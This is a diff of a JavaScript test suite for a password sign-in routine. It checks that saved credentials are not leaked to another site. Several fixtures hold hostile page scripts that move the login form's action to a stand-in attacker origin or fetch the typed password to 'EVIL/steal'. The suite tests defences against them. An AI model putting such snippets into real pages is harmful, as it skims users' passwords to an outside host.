@@ -126,8 +126,11 @@ describe(signIn, () => {
         expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
     });
 
-    it("does not send a form whose action a script moved to another site after the check", async () => {
-        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", (event) => { event.target.form.action = "${evil.origin}/steal"; });`);
+    it.each([
+        ["as the password is typed", `document.forms[0].pw.addEventListener("input", () => { document.forms[0].action = "EVIL/steal"; });`],
+        ["in its submit handler", `document.forms[0].addEventListener("submit", () => { document.forms[0].action = "EVIL/steal"; });`],
+    ])("does not send a form whose action a script moves to another site %s", async (_when, script) => {
+        fixture.page = loginForm(script.replace("EVIL", () => evil.origin));
 
         const result = await run();
 
@@ -146,6 +149,66 @@ describe(signIn, () => {
         expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
         expect(evil.hits).toStrictEqual([]);
         expect(await passwordLeft()).toBe(false);
+    });
+
+    it("keeps blocking after a decoy request and a same-document navigation", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/beacon", { body: "event=submit", method: "POST" }); history.pushState({}, "", "/next"); fetch("EVIL/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`.replace(
+                "EVIL",
+                () => evil.origin,
+            ),
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it("does not count a same-origin request without the password as the form being sent", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("/beacon", { body: "event=submit", method: "POST" }); });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
+    });
+
+    it("signs in through a script that posts the login as JSON", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value }), method: "POST" }); });`,
+        );
+        fixture.onSession = (_request, response) => response.end("{}");
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(sessionPosts()).toStrictEqual([{ body: JSON.stringify({ pw: SAVED_SECRET }), method: "POST", url: "/session" }]);
+    });
+
+    it("waits for a slow server's answer before it reports where the form landed", async () => {
+        fixture.page = loginForm();
+        fixture.onSession = (_request, response) => {
+            setTimeout(() => {
+                response.writeHead(303, { location: "/home" });
+                response.end();
+            }, 2500);
+        };
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
+        expect(sessionPosts()).toHaveLength(1);
+    });
+
+    it("types nothing into a form that would post from another window", async () => {
+        fixture.page = loginForm("", 'method="post" action="/session" target="_blank"');
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("in this window"), submitted: false, success: false });
+        expect(await page.inputValue("[name=user]")).toBe("");
     });
 
     it.each([307, 308])("fails a %i redirect that would carry the password to another site", async (status) => {
